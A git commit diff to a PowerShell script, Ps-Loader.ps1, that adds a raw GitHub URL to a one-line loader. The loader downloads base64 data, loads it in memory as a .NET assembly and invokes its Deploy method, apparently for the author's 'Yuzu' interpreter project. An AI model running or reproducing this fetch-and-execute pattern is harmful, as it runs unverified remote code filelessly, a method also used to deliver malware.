491719396f679814bf1c45247a4de0985bccad4d
ミユキ <93561149+mi-yuki@users.noreply.github.com>
2023-12-06 14:39:56 -0600

    Update Ps-Loader.ps1

--- Ps-Loader.ps1
+++ Ps-Loader.ps1
@@ -1,2 +1,2 @@
 ﻿Clear-Host
-[Reflection.Assembly]::Load([Convert]::FromBase64String((iwr "").Content)).GetType("Yuzu.Hosting.YuzuInterpreter").GetMethod("Deploy").Invoke($null, @($null))
+[Reflection.Assembly]::Load([Convert]::FromBase64String((iwr "https://raw.githubusercontent.com/mi-yuki/Yuzu/main/yz-core.raw").Content)).GetType("Yuzu.Hosting.YuzuInterpreter").GetMethod("Deploy").Invoke($null, @($null))
